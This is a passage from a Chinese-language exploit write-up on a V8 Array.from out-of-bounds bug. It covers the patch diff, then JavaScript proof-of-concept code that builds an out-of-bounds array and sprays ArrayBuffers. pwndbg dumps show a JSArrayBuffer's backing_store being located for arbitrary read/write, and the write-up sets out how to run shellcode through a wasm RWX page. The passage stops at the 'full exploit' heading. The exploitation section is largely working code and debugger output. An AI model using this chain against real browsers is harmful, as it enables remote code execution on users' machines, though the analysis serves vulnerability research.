thisArg]])中arrayLike对象的实际长度；如poc中我们在最后一轮迭代时设置oobArray的实际长度为0，在执行完maxSize次迭代后调用GenerateSetLength，这时oobArray迭代次数index>设置的实际长度0，并不会跳转到runtime设置oobArray的长度为我们设置的实际长度0，这样我们在实际长度为0的oobArray里拥有迭代次数index大小长度的访问权，就造成了越界访问。
patch中修改SmiLessThan为SmiNotEqual，这样在迭代次数>迭代函数中设置的实际长度时也会跳转到runtime执行设置数组的长度为迭代函数中设置的实际长度，就避免了oob的发生。
    -      // 3) If the created array already has a length greater than required,
    +      // 3) If the created array's length does not match the required length,
           //    then use the runtime to set the property as that will insert holes
    -      //    into the excess elements and/or shrink the backing store.
    -      GotoIf(SmiLessThan(length_smi, old_length), &runtime);
    +      //    into excess elements or shrink the backing store as appropriate.
    +      GotoIf(SmiNotEqual(length_smi, old_length), &runtime);
### v8数据存储形式
在js中number都是double型的，v8为了节约存储内存和加快性能，实现的时候加了smi（small
int）型。32位系统中smi的范围是31位有符号数，64位smi范围是32位带符号数。大于2^32 v8会用float存储整型。
为了加快垃圾回收的效率需要区分number和指针，v8的做法是使用低位为标志位对它们进行区分。由于32位、64位系统的指针会字节对齐，指针的最低位一定为0，v8利用这一点最低位为1视为指针，最低位为0视为number，smi在32位系统中只有高31位是有效数据位。
### 漏洞利用
#### 总体思路
通过前面的分析我们得知这是一个越界访问漏洞，如果我们想通过这个越界访问漏洞达到任意代码执行的效果，容易想到的一种方式是通过越界访问达到任意地址写，再到劫持控制流进而任意代码执行。
#### 任意地址写
v8中达到任意地址读写的方法一般是控制一个JSArrayBuffer对象，之后的分析我们会看到JSArrayBuffer对象有一个成员域backing_store，backing_store指向初始化JSArrayBuffer时用户申请大小的堆，如果我们控制了一个JSArrayBuffer相当于一个指针和指针的内容可以同时改写。这样我们改写backing_store读取控制的JSArrayBuffer的内容就是任意地址读；我们改写backing_store修改控制的JSArrayBuffer的内容就是任意地址写。
#### 获得可控JSArrayBuffer
接下来的问题是如何得到可控的JSArrayBuffer对象，因为我们最后的目的是使得JSArrayBuffer的backing_store指针和指针的内容可写，所以这里需要JSArrayBuffer落到一个释放的oobArray里，这一步可以通过gc实现。触发gc可以通过删除对象引用实现，需要注意的一点是为了避免oobArray被gc完全回收，在最后一轮迭代后要设置oobArray.length为大于0的数如1。
    /*generate a Out-Of-Bound array and generate many ArrayBuffers and objects*/
    var bufArray = [];
    var objArray = [];
    var oobArray = [1.1];
    var maxSize = 8224;
    function objGen(tag){
        this.leak = 0x1234;
        this.tag = tag;
    }
    Array.from.call(function() { return oobArray }, {[Symbol.iterator] : x => (
        {
            counter : 0,
            next() {
            let result = 1.1;
            this.counter++;
            if (this.counter > maxSize) {
                oobArray.length = 1;
                bufArray.push(new ArrayBuffer(0xbeef));
                objArray.push(new objGen(0xdead));
                return {done: true};
            } else {
                return {value: result, done: false};
            }
            }
        }
    ) });
    for(let x=0; x [FastProperties]
     - prototype: 0x37429d985539 
     - elements: 0x155d775640c9  [PACKED_ELEMENTS]
     - length: 3
     - properties: 0x1c4546382251  {
        #length: 0x1c45463cff89  (const accessor descriptor)
     }
     - elements: 0x155d775640c9  {
               0: 0x317427c912b1 
               1: 0x317427c91269 
               2: 0x317427c91239 
     }
    pwndbg> job 0x317427c91269
    0x317427c91269: [JSArray]
     - map: 0x27e8a9702729  [FastProperties]
     - prototype: 0x37429d985539 
     - elements: 0x155d77563fb9  [PACKED_ELEMENTS]
     - length: 1
     - properties: 0x1c4546382251  {
        #length: 0x1c45463cff89  (const accessor descriptor)
     }
     - elements: 0x155d77563fb9  {
               0: 0x155d77563ec9 
            1-16: 0x1c4546382321 
     }
    pwndbg> x/10xg 0x155d77563ec9-1
    0x155d77563ec8: 0x000027e8a970d519  0x00001c4546382251
    0x155d77563ed8: 0x00001c4546382251  0x0000123400000000
    0x155d77563ee8: 0x0000dead00000000  //flag  0x0000282d394823b9
    0x155d77563ef8: 0x0000282d394823b9  0x0000282d394823b9
    0x155d77563f08: 0x0000282d394823b9  0x0000282d394823b9
    pwndbg> job 0x317427c91239
    0x317427c91239: [JSArray]
     - map: 0x27e8a9702729  [FastProperties]
     - prototype: 0x37429d985539 
     - elements: 0x155d77563d29  [PACKED_ELEMENTS]
     - length: 1
     - properties: 0x1c4546382251  {
        #length: 0x1c45463cff89  (const accessor descriptor)
     }
     - elements: 0x155d77563d29  {
               0: 0x155d77563cd9 
            1-16: 0x1c4546382321 
     }
    pwndbg> job 0x155d77563cd9
    0x155d77563cd9: [JSArrayBuffer]
     - map: 0x27e8a9703fe9  [FastProperties]
     - prototype: 0x37429d992981 
     - elements: 0x1c4546382251  [HOLEY_ELEMENTS]
     - embedder fields: 2
     - backing_store: 0x55cf2f44a130
     - byte_length: 48879
     - neuterable
     - properties: 0x1c4546382251  {}
     - embedder fields = {
        (nil)
        (nil)
     }
    pwndbg> x/10xg 0x155d77563cd9-1
    0x155d77563cd8: 0x000027e8a9703fe9  0x00001c4546382251
    0x155d77563ce8: 0x00001c4546382251  0x0000beef00000000  //flag
    0x155d77563cf8: 0x000055cf2f44a130  0x000055cf2f44a130
    0x155d77563d08: 0x000000000000beef  0x0000000000000004
    0x155d77563d18: 0x0000000000000000  0x0000000000000000
    pwndbg> x/10xg 0x55cf2f44a130-0x10  //backing_store指向内存区，chunk size=0xbf01，申请0xbeef，字节对齐后0xbef0+0x11
    0x55cf2f44a120: 0x0000000000000000  0x000000000000bf01
    0x55cf2f44a130: 0x0000000000000000  0x0000000000000000
    0x55cf2f44a140: 0x0000000000000000  0x0000000000000000
    0x55cf2f44a150: 0x0000000000000000  0x0000000000000000
    0x55cf2f44a160: 0x0000000000000000  0x0000000000000000
#### 利用wasm执行任意代码
搜索得到可控的JSArrayBuffer对象后就获得了任意地址读写的能力，任意代码执行可以通过堆利用中常规的构造unsorted
bin泄露libc，进而修改malloc_hook劫持控制流；对于v8也可以通过wasm获得一块rwx的内存，把shellcode写进这块内存再调用wasm的接口就可以执行shellcode了。
我们实例化一个wasm的对象funcAsm，通过读取前面控制的JSArrayBuffer的内容可以得到funcAsm的地址。funcAsm实际上是一个JSFunction类型的对象，实际执行的代码位于一块rwx的内存中，通过任意地址写修改这块rwx内存的内容再调用funcAsm就可以执行任意代码了。
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
    var funcAsm = wasmInstance.exports.main;
    var addressFasm = addressOf(funcAsm);
不同版本的v8中这块rwx的内存位置可能不同，在这个版本中调试发现位于wasmInstance.exports.main->shared_info->code->code+0x70的位置。
    sharedInfo: 33498958838225
    codeAddr: 52817528690241
    memoryRWX: 0x00002dd1ea0ae000
    0x1e77958abae1 
    pwndbg> x/20xg 0x30098A091641-1
    0x30098a091640: 0x00003556529828e1  0x00001e77958ab781
    0x30098a091650: 0x00003a9562c02251  0x00003a9562c02661
    0x30098a091660: 0x00001e77958ab799  0x0000049000000043
    0x30098a091670: 0x000000000000002c  0xffffffff00000000
    0x30098a091680: 0xffffffff00000000  0x0000000000000000
    0x30098a091690: 0x0000000000000000  0x0000000000000000
    0x30098a0916a0: 0xbe485756e5894855  0x00005556054ee6f0
    0x30098a0916b0: 0x2dd1ea0ae000ba49  //rwx   0xe0c148d2ff410000
    0x30098a0916c0: 0x0008c25de58b4820  0x00000001001f0f90
    0x30098a0916d0: 0x0000001d00000003  0xffffffff0fffffff
    pwndbg> vmmap 0x00002dd1ea0ae000
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x2dd1ea0ae000     0x2dd1ea0af000 rwxp     1000 0 
### 完整exp